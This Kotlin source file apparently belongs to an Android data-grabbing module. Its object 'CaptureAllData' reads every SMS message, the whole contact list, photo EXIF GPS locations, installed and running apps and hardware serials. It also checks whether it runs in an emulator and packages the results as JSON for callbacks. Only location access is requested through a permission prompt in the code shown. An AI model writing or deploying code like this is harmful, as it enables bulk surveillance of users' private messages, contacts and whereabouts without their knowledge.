package com.kk.kkxz.utils.dataCapture

import android.Manifest
import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.media.ExifInterface
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import androidx.fragment.app.FragmentActivity
import com.kk.kkxz.utils.locationInfo.LocationUtils
import com.xx.grabphonedata.JsonDataUtil
import com.xx.grabphonedata.PermissionUtil
import com.xx.grabphonedata.Simulator.EmulahopetorCheckUtil
import com.xx.grabphonedata.Simulator.EmulatorCheckCallback
import com.xx.grabphonedata.Simulator.SimulatorUtil
import com.xx.grabphonedata.TimeUtils
import com.xx.grabphonedata.bean.*
import java.io.File
import java.io.FileInputStream
import java.util.*
import kotlin.collections.ArrayList


object CaptureAllData : Handler.Callback {

    private val handler by lazy { Handler(this) }
    override fun handleMessage(msg: Message): Boolean {
        var handlerBundle = Bundle()
        when (msg.what) {
            1 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val installedAppList =
                            handlerBundle.getSerializable("installedAppList") as ArrayList<InstalledAppBean>
                    val type = handlerBundle.getInt("type")
                    if (installedAppList != null && installedAppList.size > 0) {
                        val installedAppListStr = JsonDataUtil.list2Json(installedAppList)
                        if (obtainInstalledAppDataListenner != null) {
                            obtainInstalledAppDataListenner!!.detailInstalledAppData(
                                    installedAppListStr!!
                            )
                        }
                    }
                }
            }

            2 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val simulatorInfo =
                            handlerBundle.getSerializable("simulatorInfo") as SimulatorBean
                    if (obtainSimulatorDataListenner != null) {
                        obtainSimulatorDataListenner!!.detailSimulatorData(simulatorInfo)
                    }
                }

            }

            3 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val simulatorDetaisBean =
                            handlerBundle.getSerializable("simulatorDeatilsInfo") as SimulatorDetaisBean
                    if (obtainSimulatorDetailsDataListenner != null) {
                        obtainSimulatorDetailsDataListenner!!.detailSimulatorDetailsData(
                                simulatorDetaisBean
                        )
                    }
                }
            }
            4 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val runingAppList =
                            handlerBundle.getSerializable("runingAppList") as ArrayList<RuningApp2Bean>
                    val type = handlerBundle.getInt("type")
                    if (runingAppList != null && runingAppList.size > 0) {
                        if (runingAppList != null && runingAppList.size > 0) {
                            val runingAppListStr = JsonDataUtil.list2Json(runingAppList)
                            if (obtainRunAppDataListenner != null) {
                                obtainRunAppDataListenner!!.detailRunAppData(runingAppListStr!!)
                            }
                        }

                    }
                }
            }
            5 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val mobileInfoList =
                            handlerBundle.getSerializable("mobileInfoList") as ArrayList<InstalledAppBean>
                    val type = handlerBundle.getInt("type", 0)
                    if (mobileInfoList != null && mobileInfoList.size > 0) {
                        JsonDataUtil.list2Json(mobileInfoList)!!
                    }
                }
            }

            6 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val smsInfoStr =
                            handlerBundle.getString("smsInfoStr")
                    if (smsInfoStr != null) {
                        if (obtainSmsDataListenner != null) {
                            obtainSmsDataListenner!!.detailSmsData(smsInfoStr!!)
                        }
                    }
                }
            }

            7 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val albumInfoStr =
                            handlerBundle.getString("albumInfoStr")
                    if (albumInfoStr != null) {
                        if (obtainAlbumDataListenner != null) {
                            obtainAlbumDataListenner!!.detailAlbumData(albumInfoStr!!)
                        }
                    }
                }
            }

            8 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val mediaSourceBean =
                            handlerBundle.getSerializable("mediaSourceBean") as MediaSourceBean
                    if (mediaSourceBean != null) {
                        if (obtainMediaDataListenner != null) {
                            obtainMediaDataListenner!!.detailMediaData(mediaSourceBean!!)
                        }
                    }
                }
            }




        }
        return false
    }


    public fun obtainLocationData(activity: Activity) {
        PermissionUtil.initRxPermissions(activity as FragmentActivity)
            .setPermissions(Manifest.permission.ACCESS_COARSE_LOCATION)
            .setPermissionsCallback(object : PermissionUtil.RxPermissionLisenter {
                override fun result(code: Int) {
                    when (code) {
                        PermissionUtil.IS_AGREE -> {//同意
                            LocationUtils.instance!!.setContent(activity).initLocationClient()
                                    .setListener(object : LocationUtils.LocationCallbackListener {
                                        override fun updataLocation(location: LocationBean?) {
                                            if (location != null) {
                                            }
                                        }

                                    }).start()

                        }
                        PermissionUtil.IS_REFUSE -> {//拒绝

                        }
                        PermissionUtil.IS_NOT_ASK -> {//拒绝选中不在询问
//                            //弹出进去设置弹框
//                            showPermissionDlg(
//                                activity,
//                                activity.resources.getString(R.string.permission_location)
//                            )
                        }

                    }
                }

            })

    }



    public fun obtainSimulatorData(context: Context): CaptureAllData {
        Thread(Runnable {
            val checkEmulatorFiles = SimulatorUtil.checkEmulatorFiles()
            val checkEmulatorBuild = SimulatorUtil.checkEmulatorBuild()
            val checkOperatorNameAndroid = SimulatorUtil.checkOperatorNameAndroid(context)
            val checkIsRunningInEmulator = EmulahopetorCheckUtil.singleInstance.kmReadKmSysProperty(
                    context,
                    object : EmulatorCheckCallback {
                        override fun phoneHardwareInfo(info: String?) {

                        }
                    })

            val simulatorBean = SimulatorBean(
                    checkEmulatorFiles,
                    checkOperatorNameAndroid,
                    checkIsRunningInEmulator,
                    checkEmulatorBuild
            )

            val msg = Message()
            msg.what = 2
            val bundle = Bundle()
            bundle.putSerializable("simulatorInfo", simulatorBean)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()
        }).start()

        return this
    }


    public fun obtainSimulatorDetailsData(context: Context): CaptureAllData {
        Thread(Runnable {
            var emudata_str: SimuLatorData? = null
            val emuhelp = Simulator()
            emuhelp.isEmulator(context, object : Simulator.EmulatorListener {
                override fun emulator(emudata: SimuLatorData) {
                    if (emudata != null) {
                        emudata_str = emudata
                    }
                }
            })
            val cpuInstruction1 = Build.CPU_ABI
            val cpuInstruction2 = Build.CPU_ABI2
            val checkEmulatorFiles = SimulatorUtil.checkEmulatorFiles()
            val describeTip1 = Build.TAGS
            val describeTip2 = Build.USER
            val buildType = Build.TYPE

            val simulatorDeatilsInfo = SimulatorDetaisBean(
                    emudata_str?.app_num!!,
                    emudata_str?.baseband!!,
                    emudata_str?.board!!,
                    emudata_str?.filProter!!,
                    cpuInstruction1,
                    cpuInstruction2,
                    emudata_str?.cameraProFlash!!,
                    checkEmulatorFiles.toString(),
                    emudata_str?.filProter!!,
                    emudata_str?.hardware!!,
                    emudata_str?.platform!!,
                    emudata_str?.sensorNum!!,
                    describeTip1,
                    buildType,
                    describeTip2
            )
            val msg = Message()
            msg.what = 3
            val bundle = Bundle()
            bundle.putSerializable("simulatorDeatilsInfo", simulatorDeatilsInfo)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()

        }).start()

        return this

    }


    public fun obtainRuningAppData(activity: Activity): CaptureAllData {
        Thread(Runnable {
            var manager = activity.packageManager
            // 查询所有已经安装的应用程序
            val installedAppList =
                    manager.getInstalledApplications(PackageManager.GET_UNINSTALLED_PACKAGES)
            Collections.sort(
                    installedAppList,
                    ApplicationInfo.DisplayNameComparator(manager)
            )


            val runingAppMap: MutableMap<String, ActivityManager.RunningAppProcessInfo> =
                    HashMap()
            val actManager =
                    activity.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            // 通过调用ActivityManager的getRunningAppProcesses()方法获得系统里所有正在运行的进程
            if (actManager != null) {
                val appProcessList =
                        actManager
                                .runningAppProcesses
                if (appProcessList != null) {
                    for (appProcess in appProcessList) {
                        val pid = appProcess.pid // pid
                        val processName = appProcess.processName // 进程名
                        val pkgNameList =
                                appProcess.pkgList // 获得运行在该进程里的所有应用程序包

                        // 输出所有应用程序的包名
                        if (pkgNameList != null) {
                            for (i in pkgNameList.indices) {
                                val pkgName = pkgNameList[i]
                                runingAppMap[pkgName] = appProcess
                            }
                        }
                    }
                }
            }
            // 保存所有正在运行的应用程序信息
            val runingAppInfoList: java.util.ArrayList<RuningApp2Bean> =
                    java.util.ArrayList<RuningApp2Bean>() // 保存过滤查到的AppInfo
            if (installedAppList != null) {
                for (app in installedAppList) {
                    // 如果该包名存在 则构造一个RunningAppInfo对象
                    if (runingAppMap.containsKey(app.packageName)) {
//                    int pid = pgkProcessAppMap.get(app.packageName).pid;
//                    String processName = pgkProcessAppMap.get(app.packageName).processName;
                        runingAppInfoList.add(RuningApp2Bean(app.loadLabel(manager) as String))
                    }
                }
            }

            val msg = Message()
            msg.what = 4
            val bundle = Bundle()
            bundle.putSerializable("runingAppList", runingAppInfoList)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()
        }).start()
        return this
    }


    public fun obtainScreenesolutionData(activity: Activity): ScreenSolutionData? {
        var screenSolutionData: ScreenSolutionData? = null
        val isplayMetrics = activity.getResources().getDisplayMetrics()

        val displayMetricsStr = JsonDataUtil.object2Json(isplayMetrics)
        val displayMetricsMap = JsonDataUtil.json2Map(displayMetricsStr)

        if (displayMetricsMap != null) {
            screenSolutionData = ScreenSolutionData(
                    displayMetricsMap.get("density").toString(),
                    displayMetricsMap.get("densityDpi").toString(),
                    displayMetricsMap.get("heightPixels").toString(),
                    displayMetricsMap.get("widthPixels").toString(),

                    displayMetricsMap.get("noncompatDensity").toString(),
                    displayMetricsMap.get("noncompatDensityDpi").toString(),
                    displayMetricsMap.get("noncompatHeightPixels").toString(),
                    displayMetricsMap.get("noncompatWidthPixels").toString(),

                    displayMetricsMap.get("noncompatScaledDensity").toString(),
                    displayMetricsMap.get("noncompatXdpi").toString(),
                    displayMetricsMap.get("noncompatYdpi").toString(),

                    displayMetricsMap.get("scaledDensity").toString(),
                    displayMetricsMap.get("xdpi").toString(),
                    displayMetricsMap.get("ydpi").toString()
            )
        }
        return screenSolutionData
    }


    public fun obtainHardwareInforData(): StorageHardware {
        val mainboard = Build.BOARD
        val bootloader = Build.BOOTLOADER
        val brand = Build.BRAND
        val device = Build.DEVICE

        val hardware = Build.HARDWARE
        val model = Build.MODEL
        val product = Build.PRODUCT
        val manufacturer = Build.MANUFACTURER
        val fingerprint = Build.FINGERPRINT
        val display = Build.DISPLAY
        val radioVersion = Build.getRadioVersion()
        val SerialNumber = Build.SERIAL
        val host = Build.HOST
        val listOfRevisions = Build.ID


        val storageHardware = StorageHardware(
                mainboard,
                bootloader,
                brand,
                device,
                hardware,
                model,
                product,
                manufacturer,
                fingerprint,
                display,
                radioVersion,
                SerialNumber,
                host,
                listOfRevisions
        )

        return storageHardware

    }


    public fun obtainInstalledAppData(context: Context): CaptureAllData {
        Thread(Runnable {
            val appListInfos: java.util.ArrayList<InstalledAppBean> =
                    java.util.ArrayList<InstalledAppBean>()
            val manager = context.packageManager
            val list =
                    manager.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES)
            for (i in list.indices) {
                val installedBean = InstalledAppBean()
                val packageInfo = list[i]
                //安装时间
                val firstInstallTime: Long =
                        millisecond2Seconds(packageInfo.firstInstallTime)
                //是否为系统应用
                if (packageInfo.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM > 0) { //是
                    installedBean.installappType = 1
                } else {
                    installedBean.installappType = 2
                }

                //安装app的版本号
                var versionName: String = "0"
                if (packageInfo.versionName != null) {
                    versionName = packageInfo.versionName
                }
                var appName = ""
                //获取到设备上已经安装的应用的名字,即在AndriodMainfest中的app_name。
                if (packageInfo.applicationInfo.loadLabel(context.packageManager) != null) {
                    appName =
                            packageInfo.applicationInfo.loadLabel(context.packageManager).toString()
                }
                var packageName: String = ""
                if (packageInfo.packageName != null) {
                    packageName = packageInfo.packageName
                }

                installedBean.installappVersion = versionName
                installedBean.installappInstallDatetime = firstInstallTime
                installedBean.installAppName = appName
                installedBean.installappPackageName = packageName
                appListInfos.add(installedBean)
            }

            val msg = Message()
            msg.what = 1
            val bundle = Bundle()
            bundle.putSerializable("installedAppList", appListInfos)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()
        }).start()
        return this
    }

    fun millisecond2Seconds(millisecond: Long): Long {
        return Math.ceil(millisecond / 1000.toDouble()).toLong()
    }



    public fun obtainAddressBookAppData(context: Context): String? {
        val mobileInfoList = ArrayList<MobileInfo2Bean>()
        var mobileInfoStr: String? = ""
        try {
            val contentResolver = context.getContentResolver()
            val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null
            )
            //moveToNext方法返回的是一个boolean类型的数据
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    //读取通讯录的姓名
                    val name = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    )
                    //读取通讯录的号码
                    val num = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    )
                    //更新时间
                    val updateTime =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
                    if (num != null && !num.isEmpty()) {
                        mobileInfoList.add(MobileInfo2Bean(name, num,updateTime))
                    }
                }
                mobileInfoStr = JsonDataUtil.arr2Json(mobileInfoList)
            }
        } catch (Proe: Exception) {
            Proe.fillInStackTrace()
        }

        return mobileInfoStr
    }



    public fun obtainSMSData(context: Context): CaptureAllData {
        Thread(Runnable {
            var smsInfoStr: String? = ""
            val uri = Uri.parse("content://sms/")
            val resolver = context.getContentResolver()
            val cursor = resolver.query(
                    uri,
                    arrayOf("_id", "body", "date", "type", "read", "date", "person", "address"),
                    null,
                    null,
                    null
            )
            val smsInfos = ArrayList<SmsInfo>()
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    var _id = 0
                    var body = ""
                    var date = 0L
                    var type = 0
                    var read = 0
                    var date2 = 0L
                    var person = 0
                    var address = ""
                    if (cursor.getInt(0) != null) {
                        _id = cursor.getInt(0)
                    }
                    if (cursor.getString(1) != null) {
                        body = cursor.getString(1)
                    }
                    if (cursor.getLong(2) != null) {
                        date = cursor.getLong(2)
                    }
                    if (cursor.getInt(3) != null) {
                        type = cursor.getInt(3)
                    }
                    if (cursor.getInt(4) != null) {
                        read = cursor.getInt(4)
                    }
                    if (cursor.getLong(5) != null) {
                        date2 = cursor.getLong(5)
                    }
                    if (cursor.getInt(6) != null) {
                        person = cursor.getInt(6)
                    }
                    if (cursor.getString(7) != null) {
                        address = cursor.getString(7)
                    }
//                val body = cursor.getString(1)
//                val date = cursor.getLong(2)
//                val type = cursor.getInt(3)
//                val read = cursor.getInt(4)
//                val date2 = cursor.getLong(5)
//                val person = cursor.getInt(6)
//                val address = cursor.getString(7)

                    val smsInfo = SmsInfo(
                            body,
                            date.toString(),
                            type.toString(),
                            read.toString(),
                            date2.toString(),
//                    person.toString(),
                            address,
                            address
                    )
                    smsInfos.add(smsInfo)
                }
                cursor.close()
            }

            if (smsInfos != null && smsInfos.size > 0) {
                smsInfoStr = JsonDataUtil.arr2Json(smsInfos)
            }
            val msg = Message()
            msg.what = 6
            val bundle = Bundle()
            bundle.putSerializable("smsInfoStr", smsInfoStr)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()


        }).start()
        return this
    }


    public fun obtainAlbumData(context: Context): CaptureAllData {
        Thread(Runnable {
            val albumInfos = ArrayList<AlbumInfo>()
            var albumInfoStr: String? = ""
            val photoCursor = context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            )

            if (photoCursor != null && photoCursor.getCount() > 0) {
                try {
                    while (photoCursor.moveToNext()) {
                        //照片路径
                        val photoPath =
                            photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA))
                        //照片日期
                        var formatDataPhotoDate = ""
                        if (photoCursor.getLong(photoCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)) != null) {
                            val photoDate =
                                photoCursor.getLong(photoCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
                            formatDataPhotoDate = TimeUtils.formatDateToYyyyMmDd(photoDate)
                        }
                        //照片标题
                        var photoTitle = ""
                        if (photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)) != null) {
                            photoTitle =
                                photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME))
                        }


                        //照片长度
                        var photoHeight = ""
                        var photoWidth = ""
                        var sName =""
                        var lat =0.0
                        var lon =0.0
                        //厂家
                        var sMake: String? = ""
                        //型号
                        var sModel: String? = ""
                        //区分高版本android
                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                            val options = BitmapFactory.Options()
                            options.inJustDecodeBounds = true
                            BitmapFactory.decodeFile(photoPath, options)

                            photoHeight = options.outHeight.toString()
                            photoWidth = options.outWidth.toString()

                            val exif = ExifInterface(photoPath)

                            if (exif.getAttribute(ExifInterface.TAG_MAKE) != null) {
                                sMake = exif.getAttribute(ExifInterface.TAG_MAKE)
                            }

                            if (exif.getAttribute(ExifInterface.TAG_MODEL) != null) {
                                sModel = exif.getAttribute(ExifInterface.TAG_MODEL)
                            }
                            //创建时间
                            //val sDataTime = exif.getAttribute(ExifInterface.TAG_DATETIME)
                            val sDataTime = formatDataPhotoDate
                            //名称
                            sName = photoTitle

                            //纬度
                            val latitude_exif = exif.getAttribute(ExifInterface.TAG_GPS_LATITUDE)
                            //经度
                            val longitude_exif = exif.getAttribute(ExifInterface.TAG_GPS_LONGITUDE)
                            val latRef =
                                    exif.getAttribute(ExifInterface.TAG_GPS_LATITUDE_REF)
                            val lngRef =
                                    exif.getAttribute(ExifInterface.TAG_GPS_LONGITUDE_REF)

                            //纬度，真正
                            lat = score2dimensionality(latitude_exif)
                            //经度，真正
                            lon = score2dimensionality(longitude_exif)
                        }


                        val albumInfo = AlbumInfo(
                                "", formatDataPhotoDate, photoHeight, photoWidth, photoTitle,
                                lat.toString(), lon.toString(), sMake!!, sModel!!, photoTitle
                        )
                        albumInfos.add(albumInfo)

//                    LogUtils.e("测试，照片，个数：" + photoCursor.getCount() + " 纬度=" + lat + " 经度=" + lon + " 标题=" + photoTitle)
//                    LogUtils.e("测试，照片，个数："+photoCursor.getCount()+" 路径=" + photoPath + " 日期=" + photoDate + " 标题=" + photoTitle + " 类型=" + photoType
                        //                    + " 长度=" + photoHeight + " 宽度=" + photoWidth + " 大小=" + photoSize)
//                    LogUtils.e("测试，照片，个数：" + photoCursor.getCount() + " 纬度=" + latitude + " 经度=" + longitude)
//                    LogUtils.e("测试，照片，个数："+photoCursor.getCount()+" 厂家="+sMake+" 型号="+sModel)
//                    LogUtils.e("测试，照片，个数："+photoCursor.getCount()+" 创建时间="+sDataTime+" 名称="+sName+" 时间="+photoDate)
                    }
                    photoCursor.close()
                } catch (e: Exception) {

                } finally {
                    if (photoCursor != null) photoCursor.close()
                }

                if (albumInfos != null && albumInfos.size > 0) {
                    albumInfoStr = JsonDataUtil.arr2Json(albumInfos)
                }

                val msg = Message()
                msg.what = 7
                val bundle = Bundle()
                bundle.putSerializable("albumInfoStr", albumInfoStr)
                msg.data = bundle
                Looper.prepare()
                handler.sendMessage(msg)
                Looper.loop()
            }

        }).start()
        return this
    }



    public fun obtainMediaSourceData(context: Context): CaptureAllData {
        Thread(Runnable {
            val mediaSourceBean = MediaSourceBean()

            val imagesCursor = context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            )
            if (imagesCursor != null && imagesCursor.getCount() > 0) {
                mediaSourceBean.photo_number = imagesCursor.getCount()
            } else {
                mediaSourceBean.photo_number = 0
            }
            val videoCursor = context.contentResolver.query(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            )
            if (videoCursor != null && videoCursor.getCount() > 0) {
                mediaSourceBean.video_number = videoCursor.getCount()
            } else {
                mediaSourceBean.video_number = 0
            }
            val audioCursor = context.contentResolver.query(
                    MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            )
            if (audioCursor != null && audioCursor.getCount() > 0) {
                mediaSourceBean.audio_number = audioCursor.getCount()
            } else {
                mediaSourceBean.audio_number = 0
            }

            val msg = Message()
            msg.what = 8
            val bundle = Bundle()
            bundle.putSerializable("mediaSourceBean", mediaSourceBean)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()

        }).start()
        return this
    }


    private fun score2dimensionality(string: String?): Double {
        var dimensionality = 0.0
        if (null == string) {
            return dimensionality
        }

        //用 ，将数值分成3份
        val split = string.split(",".toRegex()).toTypedArray()
        for (i in split.indices) {
            val s = split[i].split("/".toRegex()).toTypedArray()
            //用112/1得到度分秒数值
            val v = s[0].toDouble() / s[1].toDouble()
            //将分秒分别除以60和3600得到度，并将度分秒相加
            dimensionality = dimensionality + v / Math.pow(60.0, i.toDouble())
        }
        return dimensionality
    }




    interface OnObtainInstalledAppDataListenner {
        fun detailInstalledAppData(data: String)
    }

    var obtainInstalledAppDataListenner: OnObtainInstalledAppDataListenner? = null
    fun setInstalledAppDataListenner(listener: OnObtainInstalledAppDataListenner) {
        obtainInstalledAppDataListenner = listener
    }

    interface OnObtainSimulatorDataListenner {
        fun detailSimulatorData(data: SimulatorBean)
    }

    var obtainSimulatorDataListenner: OnObtainSimulatorDataListenner? = null
    fun setSimulatorDataListenner(listener: OnObtainSimulatorDataListenner) {
        obtainSimulatorDataListenner = listener
    }

    interface OnObtainSimulatorDetailsDataListenner {
        fun detailSimulatorDetailsData(data: SimulatorDetaisBean)
    }

    var obtainSimulatorDetailsDataListenner: OnObtainSimulatorDetailsDataListenner? = null
    fun setSimulatorDetailsDataListenner(listener: OnObtainSimulatorDetailsDataListenner) {
        obtainSimulatorDetailsDataListenner = listener
    }

    interface OnObtainRunAppDataListenner {
        fun detailRunAppData(data: String)
    }

    var obtainRunAppDataListenner: OnObtainRunAppDataListenner? = null
    fun setRunAppDataListenner(listener: OnObtainRunAppDataListenner) {
        obtainRunAppDataListenner = listener
    }

    interface OnObtainSmsDataListenner {
        fun detailSmsData(data: String)
    }

    var obtainSmsDataListenner: OnObtainSmsDataListenner? = null
    fun setSmsDataListenner(listener: OnObtainSmsDataListenner) {
        obtainSmsDataListenner = listener
    }

    interface OnObtainAlbumDataListenner {
        fun detailAlbumData(data: String)
    }

    var obtainAlbumDataListenner: OnObtainAlbumDataListenner? = null
    fun setAlbumDataListenner(listener: OnObtainAlbumDataListenner) {
        obtainAlbumDataListenner = listener
    }

    interface OnObtainMediaDataListenner {
        fun detailMediaData(data: MediaSourceBean)
    }
    var obtainMediaDataListenner: OnObtainMediaDataListenner? = null
    fun setMediaDataListenner(listener: OnObtainMediaDataListenner) {
        obtainMediaDataListenner = listener
    }


}